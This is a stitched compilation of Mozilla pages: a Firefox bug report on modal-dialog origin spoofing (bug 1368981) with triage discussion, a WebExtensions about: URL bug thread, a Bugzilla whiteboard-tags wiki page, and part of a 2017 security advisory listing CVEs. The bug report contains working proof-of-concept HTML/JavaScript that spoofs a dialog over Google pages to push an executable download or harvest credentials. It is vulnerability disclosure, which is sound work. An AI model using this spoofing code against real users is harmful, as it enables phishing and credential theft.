| **S1** | (Catastrophic) Blocks development/testing, may impact more than 25% of users, causes data loss, likely dot release driver, and no workaround available |
| **S2** | (Serious) Major functionality/product severely impaired or a high impact issue and a satisfactory workaround does not exist |
| **S3** | (Normal) Blocks non-critical functionality or a work around exists |
| **S4** | (Small/Trivial) minor significance, cosmetic issues, low or no impact to users |

Bug detected in Firefox browsers that do not use multi-process architecture or e10s
Tested in:
Firefox Nightly 55.0a1 (2017-05-17) (64-bit)
Firefox Developer Edition 54.0a2 (2017-04-18) (32-bits)
Firefox 53.0.2 (32-bit)
Note:
I consider that it is not a variant of the bug with id 1365875 because the showModalDialog method is not part of the three types of native popup boxes in javascript

You could use the showModalDialog method to download a file from an unauthorized domain.
Example:
data:text/html,<input type="button" onclick="go()" value="test"/><script>
function loadIframe() {
var win = open('','\_top');
win.document.open();
win.document.write('data:text/html,<s'+'cript>location = \'<https://www.google.com>\';</s'+'cript>');
win.document.close();
}
function go() {
var iframe = '<iframe style="border:0;height:0;width:0" onload="loadIframe();"></iframe>';
document.body.innerHTML += iframe;
window.showModalDialog('[http://d.7-zip.org/a/7z1700.exe',window,'dialogWidth=100px;dialogHeight:100px](http://d.7-zip.org/a/7z1700.exe%27%2Cwindow%2C%27dialogWidth%3D100px;dialogHeight:100px)');
}
</script>

And it could even steal the credentials of an unsuspecting user.
Go to:
data:text/html,<input type="button" onclick="go()" value="test"/>
<script>
function loadIframe() {
var win = open('','\_top');
win.document.open();
win.document.write('data:text/html,<s'+'cript>location = \'<https://mail.google.com>\';</s'+'cript>');
win.document.close();
}
function go() {
var iframe = '<iframe style="border:0;height:0;width:0" onload="loadIframe();"></iframe>';
document.body.innerHTML = iframe;
window.showModalDialog('data:text/html,<h3>Loadig...</h3><input type="button" value="Accept" onclick="window.close()"/>',window,'dialogWidth=100px;dialogHeight:100px');
location = '<http://feeds.feedburner.com/GoogleInbox>';
}

(In reply to Andrew Overholt [:overholt] from [comment #3](/show_bug.cgi?id=1368981#c3 "RESOLVED FIXED - Firefox allows you to insert modal dialog in any domain"))
> We're removing showModalDialog with e10s (in [bug 981796](/show_bug.cgi?id=981796 "RESOLVED FIXED - Remove window.showModalDialog")), right, Blake?
showModalDialog isn't supported with e10s, and [comment 0](/show_bug.cgi?id=1368981#c0 "RESOLVED FIXED - Firefox allows you to insert modal dialog in any domain") says this doesn't affect e10s.
We looked at this in sec triage, and it seemed like a fairly convincing spoof.

Let's just turn off showModalDialog for everybody. It'll be behind a pref for a bit and we'll remove the code soon after.

I was thinking we'd eventually get e10s to 100% but [comment 6](/show_bug.cgi?id=1368981#c6 "RESOLVED FIXED - Firefox allows you to insert modal dialog in any domain") works for me. I'm assuming we'll just do that in [bug 981796](/show_bug.cgi?id=981796 "RESOLVED FIXED - Remove window.showModalDialog").

Hi,
I do not know what exactly means "bug which should be worked on in the next release/iteration"
but I have checked that it is reproduced in:
- Firefox 55.0.3 (32-bit)
- Firefox ESR 52.3.0 (64-bit)
It is not reproduced in:
- Firefox Developer Edition 56.0b3 (32-bits)
- Firefox Nightly 57.0a1 (2017-08-28) (64-bit)
Tested in Firefox browsers that do not use multi-process architecture or e10s.
(I used the html code from [Comment 2](/show_bug.cgi?id=1368981#c2 "RESOLVED FIXED - Firefox allows you to insert modal dialog in any domain"))

It used to be possible for extensions to load privileged about: pages in the sidebar with browser.sidebarAction.setPanel but now with OOP enabled they fail to load with the following errors:
"Error: You cannot use the AddonManager in child processes!"
"Use of nsIFile in content process is deprecated."

Some of these URLs fail to load properly in OOP mode, but extensions should not be able to load them at all. The missing security check is the security issue.Flags: needinfo?(kmaglione+bmo)

Is this also an issue with browserAction and pageAction? None do a check on the url passed to setPopup/Panel, just context.uri.resolve(newUrl).

I tested browserAction and pageAction popups and they are also affected.
I don't see there being anything inherently malicious about simply loading a privileged about: page, I haven't encountered any way to interfere with the privileged content. [Bug 1371793](/show_bug.cgi?id=1371793 "RESOLVED DUPLICATE - Allow the creation of tabs with about: URLs") is already considering allowing this for tabs and goes over some of the security considerations.

Much appreciated.

I agree there is nothing inherently malicious, but when it is, there are some about pages that become a problem. [Bug 1371793](/show_bug.cgi?id=1371793 "RESOLVED DUPLICATE - Allow the creation of tabs with about: URLs") is there to figure out what ones are safe or not, etc. Until that is resolved, it is easier to blanket assume problems.
All our about pages are or will basically end up being designed for tab based browsers. I don't think we should allow them in other areas. I've done that, some simply do not work well in small format.

CC :ckerschb because I would have expected docshell to prevent the load (independent of separate security checks being present or not) iff the triggering principal of the load was correct, which I therefore assume it isn't.

Yes. I think we may have checked those URLs in the popup code in the past. The check should have been moved to the schema when that was removed.

Correct, we don't set a triggering principal for these loads, which we probably should. The same goes for tab loads via the tabs and windows APIs.

This is an assigned P1 bug without activity in two weeks.
If you intend to continue working on this bug for the current release/iteration/sprint, remove the 'stale-bug' keyword.
Otherwise we'll reset the priority of the bug back to '--' on Monday, August 28th.Keywords: [stale-bug](/buglist.cgi?keywords=stale-bug&resolution=---)

Can we do this in a followup bug if doing it here is tricky (which it probably is, esp. the tabs/windows API thing)?

Yes. Please file a follow-up bug. I think we should definitely do this, but it also seems separate from this bug.

Each bug has a free-form single line text entry box for adding tags and status information. This wiki page is dedicated to collect a comprehensive list of whiteboard tags used in the Mozilla project.

## Whiteboard considered harmful

It is recommended that you request alternative metadata instead of using whiteboard tagging.

* Updating whiteboards tags through the API is non-trivial
* There is no global auto-suggest for whiteboard tags
* There is no verification of whiteboard tags; typos will not be caught and prevented
* Renaming a whiteboard tag requires writing a script to update every bug with that tag, changing its last modified timestamp and generating bugmail; other solutions involve a simple change by administrators
* Whiteboard tags cannot be disabled; people might continue to provide them after they are no longer relevant thinking they still apply
* If desired it's possible to restrict who can set flags to particular values; it will never be possible to prevent accidental or other changes to the whiteboard from any user with editbugs or the bug's reporter

Consider using a keyword, a flag, or a status flag. You can request this on [Bugzilla](https://bugzilla.mozilla.org/enter_bug.cgi?product=bugzilla.mozilla.org&component=Administration).

## Contributor mentoring

For more information, see [Mentors](/Mentors "Mentors").

* `[lang=]`: The programming language involved for this bug.
* `[mentor-lang=]`: (human/natural) language other than English the mentor will be able to communicate to the contributor with.

## Automated Testing

* `[test disabled]`: Indicates an automated test has been disabled. Typically used in bugs filed for intermittent test failures, to indicate that the absence of new failures in the bug is due to the test being disabled - as well as remind module owners that the test needs fixing and re-enabling.

## Autonag

`[no-nag]`: Indicates that a bug should not be modified or commented in by our [Autonag](/Release_Management/autonag "Release Management/autonag") scripts.

## Release Engineering

* `[capacity]`: This bug will help increase (or free up) capacity for our automated build & test machines.

## Sheriffing

* `[leave open]`: This has [been deprecated](https://groups.google.com/forum/#!topic/mozilla.dev.platform/Ie9OXcWbTSs) in favour of the 'leave-open' keyword. Used to ensure that the bug updating tool mcMerge does not close the bug when commits referencing it are merged into mozilla-central.
* `[retriggered]`: Used by sheriffs when investigating Fresh Oranges [[1]](https://charts.mozilla.org/FreshOranges/index.html) to find where a failure started from, using backfills and retriggers

## Firefox

* `dupeme`, `dupme`, or `DUPEME`: we're pretty sure this bug report is a duplicate of another bug, but cannot recall which one or cannot find it.
* `[qa-]`: QE (Quality Engineering) verification not required - superseded by the qe-verify flag.
* `[adv-mainNN+]` (where `NN` is some number): a security advisory about this bug for the release `NN` will be (has been) written.
* `[MemShrink]`: [a project](/Performance/MemShrink "Performance/MemShrink") to reduce memory consumption.

## Community reported bugs

* `[nightly-community]`: This bug was reported by a member of the Firefox Nightly community. Used to triage community-reported bugs and measure the impact of our core community on product quality.
* `[mozfr-community]`: This bug was reported by a member of the MozFR French-speaking community. Used to evaluate the impact of the mozfr.org community on product quality.

## Firefox OS

[Template:Note: This project is no longer active, but we leave these definitions for bug tracker historian purposes](/index.php?title=Template:Note:_This_project_is_no_longer_active,_but_we_leave_these_definitions_for_bug_tracker_historian_purposes&action=edit&redlink=1 "Template:Note: This project is no longer active, but we leave these definitions for bug tracker historian purposes (page does not exist)")

* `[POVB]`: Part of vendor build; the fix of this bug is not in the Mozilla codebase, but it's in our interest to track it.
* `[priority]`: Indicates we are asked by a partner to address this issue with priority.
* `[tarako_only]`: Special pref or feature that only lands on branch for Tarako (low memory phone), i.e. 1.3T branch of Gaia and Gecko. To be picked up on future releases.
* `[p=]/[u=]/[c=]/[s=]`: See [Scrum Development](/BMO/Whiteboard#Scrum_Development "BMO/Whiteboard"). Firefox OS uses the u= tag as the milestone instead, see [Firefox OS Performance Triage](/FirefoxOS/Performance/Triage#Scrumbugs_Tags "FirefoxOS/Performance/Triage")
* `[ft:<name of the team>]`, `[systemsfe]`, etc: Bugs identified to be owned by a "functional team" within B2G engineering. Each team owns a specific set of Bugzilla components, and tags are used to denote owned bugs outside of these components.

## Tor

* `[tor ###]` Part of the [Tor uplift project](/Security/Tor_Uplift/Tracking "Security/Tor Uplift/Tracking"). For example, `[tor 16620]` indicates a corresponding ticket at <https://trac.torproject.org/16620>. See also <https://torpat.ch/uplift>

## Web Compatibility

[Our whiteboard keywords](/Compatibility/BugsGuide "Compatibility/BugsGuide") are already described.

## Scrum Development

The following flags are used by tools like [scrumbu.gs](https://scrumbu.gs/help/) for managing sprints using the scrum development framework:

* `[p=]`: A rough estimate from engineer on how long the bug is going to take.
* `[u=]`: The user (in the scrum sense) that this story affects
* `[c=]`: The component (in the scrum sense) that this story affects
* `[s=]`: An explicit sprint slug this bug should belong to.

If you are not managing a product, you probably don't have to set these.

## What does this whiteboard keyword mean?

If you know what one of the following whiteboard keywords means, please describe it and put it into one of the above categories above (or create a new one):

* `[2.0-FL-bug-bash]` (example: <https://bugzilla.mozilla.org/show_bug.cgi?id=1021384>)
* `[games]` (example: <https://bugzilla.mozilla.org/show_bug.cgi?id=1017892>)
* `[reserve-photon-structure]` ([examples](https://bugzilla.mozilla.org/buglist.cgi?list_id=14108939&status_whiteboard_type=substring&status_whiteboard=%5Breserve-photon-structure%5D&order=Bug%20Number&query_format=advanced))
* `[TCP]` (example: <https://bugzilla.mozilla.org/show_bug.cgi?id=920036>)
  + my guess: Tablet Contribution Program?

##### References

* [Bug 1371889](https://bugzilla.mozilla.org/show_bug.cgi?id=1371889)

#### [#CVE-2017-7817: Firefox for Android address bar spoofing through fullscreen mode](#CVE-2017-7817)

Reporter
Raphael Saniyazov
Impact
high
##### Description

A spoofing vulnerability can occur when a page switches to fullscreen mode without user notification, allowing a fake address bar to be displayed. This allows an attacker to spoof which page is actually loaded and in use.
*Note: This attack only affects Firefox for Android. Other operating systems are not affected.*

##### References

* [Bug 1356596](https://bugzilla.mozilla.org/show_bug.cgi?id=1356596)

#### [#CVE-2017-7818: Use-after-free during ARIA array manipulation](#CVE-2017-7818)

Reporter
Nils
Impact
high
##### Description

A use-after-free vulnerability can occur when manipulating arrays of Accessible Rich Internet Applications (ARIA) elements within containers through the DOM. This results in a potentially exploitable crash.

##### References

* [Bug 1363723](https://bugzilla.mozilla.org/show_bug.cgi?id=1363723)

#### [#CVE-2017-7819: Use-after-free while resizing images in design mode](#CVE-2017-7819)

Reporter
Nils
Impact
high
##### Description

A use-after-free vulnerability can occur in design mode when image objects are resized if objects referenced during the resizing have been freed from memory. This results in a potentially exploitable crash.

##### References

* [Bug 1380292](https://bugzilla.mozilla.org/show_bug.cgi?id=1380292)

#### [#CVE-2017-7824: Buffer overflow when drawing and validating elements with ANGLE](#CVE-2017-7824)

Reporter
Omair, Andre Weissflog
Impact
high
##### Description

A buffer overflow occurs when drawing and validating elements with the ANGLE graphics library, used for WebGL content. This is due to an incorrect value being passed within the library during checks and results in a potentially exploitable crash.

##### References

* [Bug 1398381](https://bugzilla.mozilla.org/show_bug.cgi?id=1398381)

#### [#CVE-2017-7805: Use-after-free in TLS 1.2 generating handshake hashes](#CVE-2017-7805)

Reporter
Martin Thomson
Impact
high
##### Description

During TLS 1.2 exchanges, handshake hashes are generated which point to a message buffer. This saved data is used for later messages but in some cases, the handshake transcript can exceed the space available in the current buffer, causing the allocation of a new buffer. This leaves a pointer pointing to the old, freed buffer, resulting in a use-after-free when handshake hashes are then calculated afterwards. This can result in a potentially exploitable crash.

##### References

* [Bug 1377618](https://bugzilla.mozilla.org/show_bug.cgi?id=1377618)

#### [#CVE-2017-7812: Drag and drop of malicious page content to the tab bar can open locally stored files](#CVE-2017-7812)

Reporter
Tooru Fujisawa
Impact
moderate
##### Description

If web content on a page is dragged onto portions of the browser UI, such as the tab bar, links can be opened that otherwise would not be allowed to open. This can allow malicious web content to open a locally stored file through `file:` URLs.

##### References

* [Bug 1379842](https://bugzilla.mozilla.org/show_bug.cgi?id=1379842)

#### [#CVE-2017-7814: Blob and data URLs bypass phishing and malware protection warnings](#CVE-2017-7814)

Reporter
François Marier
Impact
moderate
##### Description

File downloads encoded with `blob:` and `data:` URL elements bypassed normal file download checks though the Phishing and Malware Protection feature and its block lists of suspicious sites and files. This would allow malicious sites to lure users into downloading executables that would otherwise be detected as suspicious.

##### References

* [Bug 1376036](https://bugzilla.mozilla.org/show_bug.cgi?id=1376036)

#### [#CVE-2017-7813: Integer truncation in the JavaScript parser](#CVE-2017-7813)

Reporter
Abhishek Arya
Impact
moderate
##### Description

Inside the JavaScript parser, a cast of an integer to a narrower type can result in data read from outside the buffer being parsed. This usually results in a non-exploitable crash, but can leak a limited amount of information from memory if it matches JavaScript identifier syntax.

##### References

* [Bug 1383951](https://bugzilla.mozilla.org/show_bug.cgi?id=1383951)

#### [#CVE-2017-7825: OS X fonts render some Tibetan and Arabic unicode characters as spaces](#CVE-2017-7825)

Reporter
Khalil Zhani
Impact
moderate
##### Description

Several fonts on OS X display some Tibetan and Arabic characters as whitespace. When used in the addressbar as part of an IDN this can be used for domain name spoofing attacks.
*Note: This attack only affects OS X operating systems. Other operating systems are unaffected.*

##### References

* [Bug 1393624](https://bugzilla.mozilla.org/show_bug.cgi?id=1393624)
* [Bug 1390980](https://bugzilla.mozilla.org/show_bug.cgi?id=1390980)

#### [#CVE-2017-7815: Spoofing attack with modal dialogs on non-e10s installations](#CVE-2017-7815)

Reporter
Jose María Acuña
Impact
moderate
##### Description

On pages containing an iframe, the `data:` protocol can be used to create a modal dialog through Javascript that will have an arbitrary domains as the dialog's location, spoofing of the origin of the modal dialog from the user view.
*Note: This attack only affects installations with e10 multiprocess turned off. Installations with e10s turned on do not support the modal dialog functionality.*

##### References

* [Bug 1368981](https://bugzilla.mozilla.org/show_bug.cgi?id=1368981)

#### [#CVE-2017-7816: WebExtensions can load about: URLs in extension UI](#CVE-2017-7816)

Reporter
Kestrel
Impact
moderate
##### Description

WebExtensions could use popups and panels in the extension UI to load an `about:` privileged URL, violating security checks that disallow this behavior.

##### References

* [Bug 1380597](https://bugzilla.mozilla.org/show_bug.cgi?id=1380597)

#### [#CVE-2017-7821: WebExtensions can download and open non-executable files without user interaction](#CVE-2017-7821)

Reporter
Abdulrahman Alqabandi
Impact
moderate
##### Description

A vulnerability where WebExtensions can download and attempt to open a file of some non-executable file types. This can be triggered without specific user interaction for the file download and open actions. This could be used to trigger known vulnerabilities in the programs that handle those document types.

##### References

* [Bug 1346515](https://bugzilla.mozilla.org/show_bug.cgi?id=1346515)

#### [#CVE-2017-7823: CSP sandbox directive did not create a unique origin](#CVE-2017-7823)

Reporter
Jun Kokatsu
Impact
moderate
##### Description

The content security policy (CSP) `sandbox` directive did not create a unique origin for the document, causing it to behave as if the `allow-same-origin` keyword were always specified. This could allow a Cross-Site Scripting (XSS) attack to be launched from unsafe content.

##### References

* [Bug 1396320](https://bugzilla.mozilla.org/show_bug.cgi?id=1396320)

#### [#CVE-2017-7822: WebCrypto allows AES-GCM with 0-length IV](#CVE-2017-7822)

Reporter
Thanh Bui
Impact
low
##### Description

The AES-GCM implementation in WebCrypto API accepts 0-length IV when it should require a length of 1 according to the NIST Special Publication 800-38D specification. This might allow for the authentication key to be determined in some instances.

##### References

* [Bug 1368859](https://bugzilla.mozilla.org/show_bug.cgi?id=1368859)

#### [#CVE-2017-7820: Xray wrapper bypass with new tab and web console](#CVE-2017-7820)

Reporter
Oriol Brufau
Impact
low
##### Description

The `instanceof` operator can bypass the Xray wrapper mechanism. When called on web content from the browser itself or an extension the web content can provide its own result for that operator, possibly tricking the browser or extension into mishandling the element.
